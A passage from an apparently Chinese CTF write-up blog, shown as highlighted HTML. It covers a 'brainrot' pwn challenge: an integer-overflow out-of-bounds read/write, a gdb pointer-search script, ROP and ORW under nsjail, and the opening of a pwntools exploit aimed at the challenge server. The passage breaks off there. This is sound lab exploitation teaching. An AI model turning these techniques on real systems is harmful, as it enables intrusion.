style="color:#DBD7CAEE">script_str</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">    if</span><span style="color:#DBD7CAEE"> size_chars </span><span style="color:#CB7676">></span><span style="color:#CB7676">=</span><span style="color:#4C9A91"> 20000</span><span style="color:#666666">:</span><br><span style="color:#B8A965">        print</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">f</span><span style="color:#C98A7D">"payload too large (chars): </span><span style="color:#4d9375">{</span><span style="color:#DBD7CAEE">size_chars</span><span style="color:#4d9375">}</span><span style="color:#C98A7D">"</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">        sys</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">exit</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">1</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    script_bytes </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> script_str</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">encode</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">utf-8</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">    io </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> remote</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">args</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">host</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> args</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">port</span><span style="color:#666666">,</span><span style="color:#BD976A"> timeout</span><span style="color:#666666">=</span><span style="color:#DBD7CAEE">args</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">timeout</span><span style="color:#5eaab5">)</span><br><br><span style="color:#758575DD">    # 握手：等待提示，发送长度（字符数）</span><br><span style="color:#DBD7CAEE">    io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">recvuntil</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">b</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">Enter solve script file size:</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">sendline</span><span style="color:#5eaab5">(</span><span style="color:#B8A965">str</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">size_chars</span><span style="color:#4d9375">)</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">encode</span><span style="color:#4d9375">(</span><span style="color:#4d9375">)</span><span style="color:#5eaab5">)</span><br><br><span style="color:#758575DD">    # 等待上传提示，发送脚本正文（UTF-8 字节）</span><br><span style="color:#758575DD">    # io.recvuntil(b"Waiting for script content...")</span><br><span style="color:#DBD7CAEE">    pause</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">    io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">send</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">script_bytes</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">    io</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">interactive</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br><br><span style="color:#4D9375">if</span><span style="color:#B8A965"> __name__</span><span style="color:#CB7676"> ==</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">__main__</span><span style="color:#C98A7D77">"</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">    main</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br></code></pre></div>
<h2 id="pwn-a-brainrot" class="scroll-target"><a href="#pwn-a-brainrot"><code class="hash inline-code">#</code>pwn a brainrot</a></h2>
<p>没见过这个语言，扔给 AI 分析了一通，找到洞应该是整数溢出，从而导致数组越界。</p>
<p>这样功能一二就相当于任意读写，程序没有开启任何保护。</p>
<p>调试发现，可以任意读写 0xc00000c1e0 之后的内存，但是没有注意到比较好的结构体。</p>
<p>写了一个在指定内存中搜索指定范围内指针的 gdb script：</p>
<div class="code-snippet"><pre data-theme="light" class="code-snippet__pre code-snippet__pre--light"><code class="language-python language-python"><span style="color:#1E754F">import</span><span style="color:#393A34"> gdb</span><br><span style="color:#1E754F">from</span><span style="color:#393A34"> pathlib </span><span style="color:#1E754F">import</span><span style="color:#393A34"> Path</span><br><br><span style="color:#AB5959">class</span><span style="color:#2E8F82"> FindPointer</span><span style="color:#2993a3">(</span><span style="color:#59873A">gdb</span><span style="color:#999999">.</span><span style="color:#59873A">Command</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#B5695977">    """</span><span style="color:#B56959">find_ptr START END LOW HIGH [CHUNK]</span><span style="color:#B5695977">"""</span><br><br><span style="color:#AB5959">    def</span><span style="color:#998418"> __init__</span><span style="color:#2993a3">(</span><span style="color:#393A34">self</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#998418">        super</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><span style="color:#999999">.</span><span style="color:#998418">__init__</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">find_ptr</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#393A34"> gdb</span><span style="color:#999999">.</span><span style="color:#A65E2B">COMMAND_DATA</span><span style="color:#2993a3">)</span><br><br><span style="color:#AB5959">    def</span><span style="color:#59873A"> invoke</span><span style="color:#2993a3">(</span><span style="color:#393A34">self</span><span style="color:#999999">,</span><span style="color:#393A34"> arg</span><span style="color:#999999">,</span><span style="color:#393A34"> from_tty</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">        argv </span><span style="color:#999999">=</span><span style="color:#393A34"> gdb</span><span style="color:#999999">.</span><span style="color:#393A34">string_to_argv</span><span style="color:#2993a3">(</span><span style="color:#393A34">arg</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">        if</span><span style="color:#998418"> len</span><span style="color:#2993a3">(</span><span style="color:#393A34">argv</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> </span><span style="color:#AB5959">&#x3C;</span><span style="color:#2F798A"> 4</span><span style="color:#999999">:</span><br><span style="color:#1E754F">            raise</span><span style="color:#393A34"> gdb</span><span style="color:#999999">.</span><span style="color:#393A34">GdbError</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">usage: find_ptr start end low high [chunk_size]</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">        start </span><span style="color:#999999">=</span><span style="color:#998418"> int</span><span style="color:#2993a3">(</span><span style="color:#393A34">argv</span><span style="color:#1e754f">[</span><span style="color:#2F798A">0</span><span style="color:#1e754f">]</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">        end   </span><span style="color:#999999">=</span><span style="color:#998418"> int</span><span style="color:#2993a3">(</span><span style="color:#393A34">argv</span><span style="color:#1e754f">[</span><span style="color:#2F798A">1</span><span style="color:#1e754f">]</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">        low   </span><span style="color:#999999">=</span><span style="color:#998418"> int</span><span style="color:#2993a3">(</span><span style="color:#393A34">argv</span><span style="color:#1e754f">[</span><span style="color:#2F798A">2</span><span style="color:#1e754f">]</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">        high  </span><span style="color:#999999">=</span><span style="color:#998418"> int</span><span style="color:#2993a3">(</span><span style="color:#393A34">argv</span><span style="color:#1e754f">[</span><span style="color:#2F798A">3</span><span style="color:#1e754f">]</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">        chunk </span><span style="color:#999999">=</span><span style="color:#998418"> int</span><span style="color:#2993a3">(</span><span style="color:#393A34">argv</span><span style="color:#1e754f">[</span><span style="color:#2F798A">4</span><span style="color:#1e754f">]</span><span style="color:#999999">,</span><span style="color:#2F798A"> 0</span><span style="color:#2993a3">)</span><span style="color:#1E754F"> if</span><span style="color:#998418"> len</span><span style="color:#2993a3">(</span><span style="color:#393A34">argv</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> </span><span style="color:#AB5959">></span><span style="color:#2F798A"> 4</span><span style="color:#1E754F"> else</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">4000</span><br><span style="color:#1E754F">        if</span><span style="color:#393A34"> end </span><span style="color:#AB5959">&#x3C;</span><span style="color:#AB5959">=</span><span style="color:#393A34"> start</span><span style="color:#999999">:</span><br><span style="color:#1E754F">            raise</span><span style="color:#393A34"> gdb</span><span style="color:#999999">.</span><span style="color:#393A34">GdbError</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">end must be larger than start</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">        if</span><span style="color:#393A34"> high </span><span style="color:#AB5959">&#x3C;</span><span style="color:#AB5959">=</span><span style="color:#393A34"> low</span><span style="color:#999999">:</span><br><span style="color:#1E754F">            raise</span><span style="color:#393A34"> gdb</span><span style="color:#999999">.</span><span style="color:#393A34">GdbError</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">high must be larger than low</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">        inferior </span><span style="color:#999999">=</span><span style="color:#393A34"> gdb</span><span style="color:#999999">.</span><span style="color:#393A34">selected_inferior</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">        if</span><span style="color:#393A34"> inferior</span><span style="color:#999999">.</span><span style="color:#393A34">pid </span><span style="color:#AB5959">is</span><span style="color:#1E754F"> None</span><span style="color:#999999">:</span><br><span style="color:#1E754F">            raise</span><span style="color:#393A34"> gdb</span><span style="color:#999999">.</span><span style="color:#393A34">GdbError</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">no running inferior</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">        addr </span><span style="color:#999999">=</span><span style="color:#393A34"> start</span><br><span style="color:#393A34">        hits </span><span style="color:#999999">=</span><span style="color:#2F798A"> 0</span><br><span style="color:#393A34">        page </span><span style="color:#999999">=</span><span style="color:#AB5959"> 0x</span><span style="color:#2F798A">1000</span><br><br><span style="color:#1E754F">        while</span><span style="color:#393A34"> addr </span><span style="color:#AB5959">&#x3C;</span><span style="color:#393A34"> end</span><span style="color:#999999">:</span><br><span style="color:#393A34">            size </span><span style="color:#999999">=</span><span style="color:#998418"> min</span><span style="color:#2993a3">(</span><span style="color:#393A34">chunk</span><span style="color:#999999">,</span><span style="color:#393A34"> end </span><span style="color:#AB5959">-</span><span style="color:#393A34"> addr</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">            try</span><span style="color:#999999">:</span><br><span style="color:#393A34">                buf </span><span style="color:#999999">=</span><span style="color:#393A34"> inferior</span><span style="color:#999999">.</span><span style="color:#393A34">read_memory</span><span style="color:#2993a3">(</span><span style="color:#393A34">addr</span><span style="color:#999999">,</span><span style="color:#393A34"> size</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">            except</span><span style="color:#393A34"> gdb</span><span style="color:#999999">.</span><span style="color:#393A34">MemoryError</span><span style="color:#999999">:</span><br><span style="color:#393A34">                addr </span><span style="color:#999999">=</span><span style="color:#999999"> </span><span style="color:#2993a3">(</span><span style="color:#1e754f">(</span><span style="color:#393A34">addr </span><span style="color:#AB5959">//</span><span style="color:#393A34"> page</span><span style="color:#1e754f">)</span><span style="color:#AB5959"> +</span><span style="color:#2F798A"> 1</span><span style="color:#2993a3">)</span><span style="color:#AB5959"> *</span><span style="color:#393A34"> page</span><br><span style="color:#1E754F">                continue</span><br><br><span style="color:#393A34">            data </span><span style="color:#999999">=</span><span style="color:#998418"> memoryview</span><span style="color:#2993a3">(</span><span style="color:#393A34">buf</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">            for</span><span style="color:#393A34"> off </span><span style="color:#1E754F">in</span><span style="color:#998418"> range</span><span style="color:#2993a3">(</span><span style="color:#2F798A">0</span><span style="color:#999999">,</span><span style="color:#998418"> len</span><span style="color:#1e754f">(</span><span style="color:#393A34">data</span><span style="color:#1e754f">)</span><span style="color:#AB5959"> -</span><span style="color:#2F798A"> 7</span><span style="color:#999999">,</span><span style="color:#2F798A"> 8</span><span style="color:#2993a3">)</span><span style="color:#999999">:</span><br><span style="color:#393A34">                val </span><span style="color:#999999">=</span><span style="color:#998418"> int</span><span style="color:#999999">.</span><span style="color:#393A34">from_bytes</span><span style="color:#2993a3">(</span><span style="color:#393A34">data</span><span style="color:#1e754f">[</span><span style="color:#393A34">off</span><span style="color:#999999">:</span><span style="color:#393A34">off</span><span style="color:#AB5959">+</span><span style="color:#2F798A">8</span><span style="color:#1e754f">]</span><span style="color:#999999">,</span><span style="color:#B5695977"> "</span><span style="color:#B56959">little</span><span style="color:#B5695977">"</span><span style="color:#2993a3">)</span><br><span style="color:#1E754F">                if</span><span style="color:#393A34"> low </span><span style="color:#AB5959">&#x3C;</span><span style="color:#AB5959">=</span><span style="color:#393A34"> val </span><span style="color:#AB5959">&#x3C;</span><span style="color:#393A34"> high</span><span style="color:#999999">:</span><br><span style="color:#998418">                    print</span><span style="color:#2993a3">(</span><span style="color:#AB5959">f</span><span style="color:#B56959">"[hit] </span><span style="color:#1e754f">{</span><span style="color:#393A34">addr</span><span style="color:#AB5959">+</span><span style="color:#393A34">off</span><span style="color:#AB5959">:#x</span><span style="color:#1e754f">}</span><span style="color:#B56959"> -> </span><span style="color:#1e754f">{</span><span style="color:#393A34">val</span><span style="color:#AB5959">:#x</span><span style="color:#1e754f">}</span><span style="color:#B56959">"</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">                    hits </span><span style="color:#999999">+=</span><span style="color:#2F798A"> 1</span><br><span style="color:#393A34">            addr </span><span style="color:#999999">+=</span><span style="color:#393A34"> size</span><br><br><span style="color:#998418">        print</span><span style="color:#2993a3">(</span><span style="color:#AB5959">f</span><span style="color:#B56959">"[done] scanned </span><span style="color:#1e754f">{</span><span style="color:#393A34">end</span><span style="color:#AB5959">-</span><span style="color:#393A34">start</span><span style="color:#AB5959">:#x</span><span style="color:#1e754f">}</span><span style="color:#B56959"> bytes, hits=</span><span style="color:#1e754f">{</span><span style="color:#393A34">hits</span><span style="color:#1e754f">}</span><span style="color:#B56959">"</span><span style="color:#2993a3">)</span><br><br><span style="color:#393A34">FindPointer</span><span style="color:#2993a3">(</span><span style="color:#2993a3">)</span><br></code></pre><pre data-theme="dark" class="code-snippet__pre code-snippet__pre--dark"><code class="language-python language-python"><span style="color:#4D9375">import</span><span style="color:#DBD7CAEE"> gdb</span><br><span style="color:#4D9375">from</span><span style="color:#DBD7CAEE"> pathlib </span><span style="color:#4D9375">import</span><span style="color:#DBD7CAEE"> Path</span><br><br><span style="color:#CB7676">class</span><span style="color:#5DA994"> FindPointer</span><span style="color:#5eaab5">(</span><span style="color:#80A665">gdb</span><span style="color:#666666">.</span><span style="color:#80A665">Command</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#C98A7D77">    """</span><span style="color:#C98A7D">find_ptr START END LOW HIGH [CHUNK]</span><span style="color:#C98A7D77">"""</span><br><br><span style="color:#CB7676">    def</span><span style="color:#B8A965"> __init__</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">self</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#B8A965">        super</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><span style="color:#666666">.</span><span style="color:#B8A965">__init__</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">find_ptr</span><span style="color:#C98A7D77">"</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> gdb</span><span style="color:#666666">.</span><span style="color:#C99076">COMMAND_DATA</span><span style="color:#5eaab5">)</span><br><br><span style="color:#CB7676">    def</span><span style="color:#80A665"> invoke</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">self</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> arg</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> from_tty</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">        argv </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> gdb</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">string_to_argv</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">arg</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">        if</span><span style="color:#B8A965"> len</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">argv</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> </span><span style="color:#CB7676">&#x3C;</span><span style="color:#4C9A91"> 4</span><span style="color:#666666">:</span><br><span style="color:#4D9375">            raise</span><span style="color:#DBD7CAEE"> gdb</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">GdbError</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">usage: find_ptr start end low high [chunk_size]</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">        start </span><span style="color:#666666">=</span><span style="color:#B8A965"> int</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">argv</span><span style="color:#4d9375">[</span><span style="color:#4C9A91">0</span><span style="color:#4d9375">]</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">        end   </span><span style="color:#666666">=</span><span style="color:#B8A965"> int</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">argv</span><span style="color:#4d9375">[</span><span style="color:#4C9A91">1</span><span style="color:#4d9375">]</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">        low   </span><span style="color:#666666">=</span><span style="color:#B8A965"> int</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">argv</span><span style="color:#4d9375">[</span><span style="color:#4C9A91">2</span><span style="color:#4d9375">]</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">        high  </span><span style="color:#666666">=</span><span style="color:#B8A965"> int</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">argv</span><span style="color:#4d9375">[</span><span style="color:#4C9A91">3</span><span style="color:#4d9375">]</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">        chunk </span><span style="color:#666666">=</span><span style="color:#B8A965"> int</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">argv</span><span style="color:#4d9375">[</span><span style="color:#4C9A91">4</span><span style="color:#4d9375">]</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 0</span><span style="color:#5eaab5">)</span><span style="color:#4D9375"> if</span><span style="color:#B8A965"> len</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">argv</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> </span><span style="color:#CB7676">></span><span style="color:#4C9A91"> 4</span><span style="color:#4D9375"> else</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">4000</span><br><span style="color:#4D9375">        if</span><span style="color:#DBD7CAEE"> end </span><span style="color:#CB7676">&#x3C;</span><span style="color:#CB7676">=</span><span style="color:#DBD7CAEE"> start</span><span style="color:#666666">:</span><br><span style="color:#4D9375">            raise</span><span style="color:#DBD7CAEE"> gdb</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">GdbError</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">end must be larger than start</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">        if</span><span style="color:#DBD7CAEE"> high </span><span style="color:#CB7676">&#x3C;</span><span style="color:#CB7676">=</span><span style="color:#DBD7CAEE"> low</span><span style="color:#666666">:</span><br><span style="color:#4D9375">            raise</span><span style="color:#DBD7CAEE"> gdb</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">GdbError</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">high must be larger than low</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">        inferior </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> gdb</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">selected_inferior</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">        if</span><span style="color:#DBD7CAEE"> inferior</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">pid </span><span style="color:#CB7676">is</span><span style="color:#4D9375"> None</span><span style="color:#666666">:</span><br><span style="color:#4D9375">            raise</span><span style="color:#DBD7CAEE"> gdb</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">GdbError</span><span style="color:#5eaab5">(</span><span style="color:#C98A7D77">"</span><span style="color:#C98A7D">no running inferior</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">        addr </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> start</span><br><span style="color:#DBD7CAEE">        hits </span><span style="color:#666666">=</span><span style="color:#4C9A91"> 0</span><br><span style="color:#DBD7CAEE">        page </span><span style="color:#666666">=</span><span style="color:#CB7676"> 0x</span><span style="color:#4C9A91">1000</span><br><br><span style="color:#4D9375">        while</span><span style="color:#DBD7CAEE"> addr </span><span style="color:#CB7676">&#x3C;</span><span style="color:#DBD7CAEE"> end</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">            size </span><span style="color:#666666">=</span><span style="color:#B8A965"> min</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">chunk</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> end </span><span style="color:#CB7676">-</span><span style="color:#DBD7CAEE"> addr</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">            try</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">                buf </span><span style="color:#666666">=</span><span style="color:#DBD7CAEE"> inferior</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">read_memory</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">addr</span><span style="color:#666666">,</span><span style="color:#DBD7CAEE"> size</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">            except</span><span style="color:#DBD7CAEE"> gdb</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">MemoryError</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">                addr </span><span style="color:#666666">=</span><span style="color:#666666"> </span><span style="color:#5eaab5">(</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">addr </span><span style="color:#CB7676">//</span><span style="color:#DBD7CAEE"> page</span><span style="color:#4d9375">)</span><span style="color:#CB7676"> +</span><span style="color:#4C9A91"> 1</span><span style="color:#5eaab5">)</span><span style="color:#CB7676"> *</span><span style="color:#DBD7CAEE"> page</span><br><span style="color:#4D9375">                continue</span><br><br><span style="color:#DBD7CAEE">            data </span><span style="color:#666666">=</span><span style="color:#B8A965"> memoryview</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">buf</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">            for</span><span style="color:#DBD7CAEE"> off </span><span style="color:#4D9375">in</span><span style="color:#B8A965"> range</span><span style="color:#5eaab5">(</span><span style="color:#4C9A91">0</span><span style="color:#666666">,</span><span style="color:#B8A965"> len</span><span style="color:#4d9375">(</span><span style="color:#DBD7CAEE">data</span><span style="color:#4d9375">)</span><span style="color:#CB7676"> -</span><span style="color:#4C9A91"> 7</span><span style="color:#666666">,</span><span style="color:#4C9A91"> 8</span><span style="color:#5eaab5">)</span><span style="color:#666666">:</span><br><span style="color:#DBD7CAEE">                val </span><span style="color:#666666">=</span><span style="color:#B8A965"> int</span><span style="color:#666666">.</span><span style="color:#DBD7CAEE">from_bytes</span><span style="color:#5eaab5">(</span><span style="color:#DBD7CAEE">data</span><span style="color:#4d9375">[</span><span style="color:#DBD7CAEE">off</span><span style="color:#666666">:</span><span style="color:#DBD7CAEE">off</span><span style="color:#CB7676">+</span><span style="color:#4C9A91">8</span><span style="color:#4d9375">]</span><span style="color:#666666">,</span><span style="color:#C98A7D77"> "</span><span style="color:#C98A7D">little</span><span style="color:#C98A7D77">"</span><span style="color:#5eaab5">)</span><br><span style="color:#4D9375">                if</span><span style="color:#DBD7CAEE"> low </span><span style="color:#CB7676">&#x3C;</span><span style="color:#CB7676">=</span><span style="color:#DBD7CAEE"> val </span><span style="color:#CB7676">&#x3C;</span><span style="color:#DBD7CAEE"> high</span><span style="color:#666666">:</span><br><span style="color:#B8A965">                    print</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">f</span><span style="color:#C98A7D">"[hit] </span><span style="color:#4d9375">{</span><span style="color:#DBD7CAEE">addr</span><span style="color:#CB7676">+</span><span style="color:#DBD7CAEE">off</span><span style="color:#CB7676">:#x</span><span style="color:#4d9375">}</span><span style="color:#C98A7D"> -> </span><span style="color:#4d9375">{</span><span style="color:#DBD7CAEE">val</span><span style="color:#CB7676">:#x</span><span style="color:#4d9375">}</span><span style="color:#C98A7D">"</span><span style="color:#5eaab5">)</span><br><span style="color:#DBD7CAEE">                    hits </span><span style="color:#666666">+=</span><span style="color:#4C9A91"> 1</span><br><span style="color:#DBD7CAEE">            addr </span><span style="color:#666666">+=</span><span style="color:#DBD7CAEE"> size</span><br><br><span style="color:#B8A965">        print</span><span style="color:#5eaab5">(</span><span style="color:#CB7676">f</span><span style="color:#C98A7D">"[done] scanned </span><span style="color:#4d9375">{</span><span style="color:#DBD7CAEE">end</span><span style="color:#CB7676">-</span><span style="color:#DBD7CAEE">start</span><span style="color:#CB7676">:#x</span><span style="color:#4d9375">}</span><span style="color:#C98A7D"> bytes, hits=</span><span style="color:#4d9375">{</span><span style="color:#DBD7CAEE">hits</span><span style="color:#4d9375">}</span><span style="color:#C98A7D">"</span><span style="color:#5eaab5">)</span><br><br><span style="color:#DBD7CAEE">FindPointer</span><span style="color:#5eaab5">(</span><span style="color:#5eaab5">)</span><br></code></pre></div>
<p>挺好使的，然后直接用这个去搜索栈地址，发现还真有。然后打 rop 应该就结束了。</p>
<p>but 环境似乎启用了 nsjail 导致无法 <code class="inline-code">execve(&quot;/bin/sh&quot;, 0, 0)</code>，打 orw 又得先 <code class="inline-code">getdents</code> 看远程文件名是什么。</p>
<p>这里卡了很久，不知道为什么远程 <code class="inline-code">getdents</code> 看不到 flag 文件，其他文件都看到的。。</p>
<p>最后 @Tplus 师傅给了我一个 mini-shell，确实很好用。</p>
<div class="code-snippet"><pre data-theme="light" class="code-snippet__pre code-snippet__pre--light"><code class="language-python language-python"><span style="color:#1E754F">from</span><span style="color:#393A34"> pwn </span><span style="color:#1E754F">import</span><span style="color:#AB5959"> *</span><br><span style="color:#1E754F">from</span><span style="color:#393A34"> sys </span><span style="color:#1E754F">import</span><span style="color:#393A34"> argv</span><br><br><span style="color:#393A34">proc </span><span style="color:#999999">=</span><span style="color:#B5695977"> "</span><span style="color:#B56959">./brainrot</span><span style="color:#B5695977">"</span><br><span style="color:#393A34">context</span><span style="color:#999999">.</span><span style="color:#393A34">log_level </span><span style="color:#999999">=</span><span style="color:#B5695977"> "</span><span style="color:#B56959">info</span><span style="color:#B5695977">"</span><br><span style="color:#393A34">context</span><span style="color:#999999">.</span><span style="color:#393A34">binary </span><span style="color:#999999">=</span><span style="color:#393A34"> proc</span><br><span style="color:#393A34">elf </span><span style="color:#999999">=</span><span style="color:#393A34"> ELF</span><span style="color:#2993a3">(</span><span style="color:#393A34">proc</span><span style="color:#999999">,</span><span style="color:#B07D48"> checksec</span><span style="color:#999999">=</span><span style="color:#1E754F">False</span><span style="color:#2993a3">)</span><br><span style="color:#393A34">io </span><span style="color:#999999">=</span><span style="color:#393A34"> remote</span><span style="color:#2993a3">(</span><span style="color:#B5695977">"</span><span style="color:#B56959">brainrot.challs.infobahnc.tf</span><span style="color:#B5695977">"</span><span style="color:#999999">,</span><span style="color:#2F798A"> 1337</span><span style="color:#2993a3">)</span><span style="color:#1E754F"> if</span><span style="color:#393A34"> argv</span><span style="color:#2993a3">[</span><span style="color:#2F798A">1</span><span style="color:#2993a3">]</span><span style="color:#AB5959"> ==</span><span style="color:#B5695977"> '</span><span style="color:#B56959">r</span><span style="color:#B5695977">'</span><span style="color:#1E754F"> else</span><span style="color:#393A34"> process</span><span style="color:#2993a3">(</span><span style="color:#393A34">proc</span><span style="color:#2993a3">)</span><br><span style="color:#A0ADA0"># io = remote("127.0.0.1", 8081) if argv[1] == 'r' else process(proc)</span><br><br><br><span style="color:#1E754F">if</span><span style="color:#393A34"> args</span><span style="color:#999999">.</span><span style="color:#393A34">G</span><span style="color:#999999">:</span><br><span style="color:#393A34">    gdb</span><span style="color:#999999">.</span><span style="color:#393A34">attach</span><span style="color:#2993a3">(</span><span style="color:#393A34">io</span><span style="color:#999999">,</span><span style="color:#B5695977"> """</span><br><span style="color:#B56959">    # b* 0x62C7B0</span><br><span style="color:#B56959">    c</span><br><span style="color:#B5695977">    """</span><span style="color:#2993a3">)</span><br><br><br><span style="color:#AB5959">def</span><span style="color:#59873A"> choose</span><span 